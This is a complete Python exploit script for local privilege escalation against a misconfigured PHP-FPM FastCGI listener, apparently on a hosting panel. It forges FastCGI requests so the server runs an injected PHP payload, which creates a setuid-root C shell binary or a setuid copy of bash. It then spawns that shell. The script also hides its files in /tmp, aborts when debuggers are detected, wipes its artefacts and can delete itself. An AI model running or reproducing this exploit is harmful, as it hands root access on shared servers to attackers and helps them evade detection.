#!/usr/bin/env python3

import socket, struct, os, subprocess, time, argparse, secrets, pwd, grp

PHP_PATH = f"/tmp/.{secrets.token_hex(6)}.php"
EXP_C_PATH = "/tmp/.syslogd.c"
EXP_BIN_PATH = "/tmp/.syslogd"
EXP_TEMP = "/tmp/.newpriv"
BIN_BASH = "/bin/bash"

def fcgi_encode_name_value_pair(name, value):
    def encode_length(length):
        return struct.pack("!B", length) if length < 128 else struct.pack("!I", length | 0x80000000)
    name_bytes = name.encode()
    value_bytes = value.encode()
    return encode_length(len(name_bytes)) + encode_length(len(value_bytes)) + name_bytes + value_bytes

def fcgi_build_packet(type, request_id, content):
    content_length = len(content)
    padding_length = (8 - (content_length % 8)) % 8
    header = struct.pack("!BBHHBB", 1, type, request_id, content_length, padding_length, 0)
    return header + content + (b"\x00" * padding_length)

def write_php_payload(select):
    php_code = ""
    if select == 0:
        php_code = (
            "<?php "
            f"system('sudo chown root:root {EXP_BIN_PATH}');"
            f"system('sudo chmod 4755 {EXP_BIN_PATH}');"
            "?>"
        )
    else:
        php_code = (
            "<?php "
            f"system('cp {BIN_BASH} {EXP_TEMP}');"
            f"system('chmod 6755 {EXP_TEMP}');"
            "?>"
        )
    with open(PHP_PATH, "w") as f:
        f.write(php_code)
    os.chmod(PHP_PATH, 0o644)
    print(f"[+] PHP payload written to {PHP_PATH}")
    return PHP_PATH

def write_exp():
    if os.path.exists(EXP_BIN_PATH):
        print(f"[!] Skipping compilation: {EXP_BIN_PATH} already exists.")
        return True
    exp_code = (
        "#include <unistd.h>\n"
        "#include <stdlib.h>\n"
        "int main() {\n"
        "    setreuid(0, 0);\n"
        "    setregid(0, 0);\n"
        "    system(\"/bin/bash\");\n"
        "    return 0;\n"
        "}"
    )
    with open(EXP_C_PATH, "w") as f:
        f.write(exp_code)
    try:
        subprocess.run(["gcc", "-w", EXP_C_PATH, "-o", EXP_BIN_PATH], check=True)
        os.chmod(EXP_BIN_PATH, 0o755)
        print(f"[+] C payload compiled to {EXP_BIN_PATH}")
        return True
    except subprocess.CalledProcessError:
        print("[!] Failed to compile c code")
        return False

def send_fcgi_common(sock, script_path):
    request_id = 1
    content = struct.pack("!HB5x", 1, 0)  # role=1 (responder), flags=0
    sock.sendall(fcgi_build_packet(1, request_id, content))

    env = {
        "SCRIPT_FILENAME": script_path,
        "REQUEST_METHOD": "GET",
        "QUERY_STRING": "",
        "SCRIPT_NAME": "/exploit",
        "REQUEST_URI": "/exploit",
        "DOCUMENT_ROOT": "/",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "GATEWAY_INTERFACE": "CGI/1.1"
    }
    payload = b''.join(fcgi_encode_name_value_pair(k, v) for k, v in env.items())
    sock.sendall(fcgi_build_packet(4, request_id, payload))
    sock.sendall(fcgi_build_packet(4, request_id, b""))
    sock.sendall(fcgi_build_packet(5, request_id, b""))

    response = b""
    while True:
        header = sock.recv(8)
        if len(header) < 8:
            break
        version, type, rid, clen, plen, _ = struct.unpack("!BBHHBB", header)
        content = sock.recv(clen) if clen > 0 else b""
        if plen > 0:
            sock.recv(plen)
        if type in (6, 7):
            response += content
        elif type == 3:
            break
    sock.close()
    return response.decode(errors="ignore")

def send_fcgi_tcp(host, port, script_path):
    sock = socket.create_connection((host, port))
    return send_fcgi_common(sock, script_path)

def send_fcgi_unix(sock_path, script_path):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)
    return send_fcgi_common(sock, script_path)

def is_suid_root(path):
    if not os.path.exists(path) or not os.access(path, os.X_OK):
        return False
    st = os.stat(path)
    return st.st_uid == 0 and (st.st_mode & 0o4000)

def pop_shell():
    print("[+] Checking setuid binary...")
    time.sleep(2)
    
    target_path = EXP_BIN_PATH if args.is_sudo else EXP_TEMP
    if not os.path.exists(target_path):
        print(f"[!] Binary not found: {target_path}")
        return False
        
    st = os.stat(target_path)
    is_suid = st.st_mode & 0o4000
    is_root_owned = st.st_uid == 0
    
    if not is_suid:
        print(f"[!] Binary is not setuid: {target_path}")
        return False
        
    if is_root_owned:
        print("[+] Setuid-root binary detected!")
        print("[!] Launching root shell...")
    else:
        target_uid = st.st_uid
        target_gid = st.st_gid
        
        username = pwd.getpwuid(target_uid).pw_name
        groupname = grp.getgrgid(target_gid).gr_name
        
        print(f"[+] Setuid-non-root binary detected (UID: {target_uid}, GID: {target_gid})")
        print(f"[!] Launching shell as {username}:{groupname}...")
    
    with open(f"/proc/{os.getpid()}/cmdline", "rb") as f:
        if b"gdb" in f.read() or b"strace" in f.read():
            print("[!] Debug tools detected. Aborting.")
            return False
    
    pid = os.fork()
    if pid == 0:
        time.sleep(1)
        if args.is_sudo:
            os.execve(target_path, [target_path], os.environ)
        else:
            target_uid = st.st_uid
            target_gid = st.st_gid
            
            env = {
                "PATH": "/usr/bin:/bin",
                "TERM": os.environ.get("TERM", "xterm"),
                "HOME": "/tmp",
            }
            shell_payload = (
                f'python3 -q -c "import os,pty;'
                f'os.remove(\'{EXP_TEMP}\');'
                f'os.setresuid({target_uid},{target_uid},{target_uid});'
                f'os.setresgid({target_gid},{target_gid},{target_gid});'
                f'pty.spawn([\'/bin/bash\'])"'
            )
            cmd = [
                EXP_TEMP,
                "-p",
                "-c",
                shell_payload
            ]
            os.execve(EXP_TEMP, cmd, env)
    else:
        os.waitpid(pid, 0)
        return True

def cleanup():
    print("[*] Clean up the mess!...")
    for f in [PHP_PATH, EXP_C_PATH, EXP_BIN_PATH, EXP_TEMP]:
        try:
            if os.path.exists(f):
                os.unlink(f)
        except:
            pass

def main():
    global args
    
    print(r"""
 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ 
||C |||L |||P |||_ |||F |||P |||M |||_ |||R |||C |||E ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
                PHP-FPM FastCGI Exploit
        
[!] Exploits a misconfigured PHP-FPM pool:
    - No listener mode restriction (owner/group/mode)
    - Allows ENV injection of SCRIPT_FILENAME
    - Leads to arbitrary PHP execution as other user or root!
""")
    
    parser = argparse.ArgumentParser(description="PHP-FPM FastCGI LPE Exploit - TCP/SOCK Mode")
    parser.add_argument("--mode", choices=["tcp", "sock"], required=True)
    parser.add_argument("--host", default="127.0.0.1", help="Host for TCP mode (default:127.0.0.1)")
    parser.add_argument("--port", type=int, default=18000, help="Port for TCP mode (default:18000)")
    parser.add_argument("--sock", default="/run/clp-fm-php-fpm.sock", help="Socket path for sock mode (default:/run/clp-fm-php-fpm.sock)")
    parser.add_argument("--self-delete", action="store_true", help="Remove exploit script after execution")
    parser.add_argument("--is-sudo", action="store_true", help="Are the target run with sudo/root?")
    args = parser.parse_args()

    try:
        if args.is_sudo:
            if not write_exp():
                return
            write_php_payload(0)
        else:
            write_php_payload(1)

        if args.mode == "tcp":
            print(f"[*] Sending FastCGI request to {args.host}:{args.port}")
            send_fcgi_tcp(args.host, args.port, PHP_PATH)
        else:
            print(f"[*] Sending FastCGI request to socket {args.sock}")
            send_fcgi_unix(args.sock, PHP_PATH)

        for _ in range(5):
            time.sleep(1)
            if pop_shell():
                break
        else:
            print("[!] Exploit failed.")
    finally:
        cleanup()
        if args.self_delete:
            print("[*] Self-deleting...")
            os.remove(__file__)

if __name__ == "__main__":
    main()
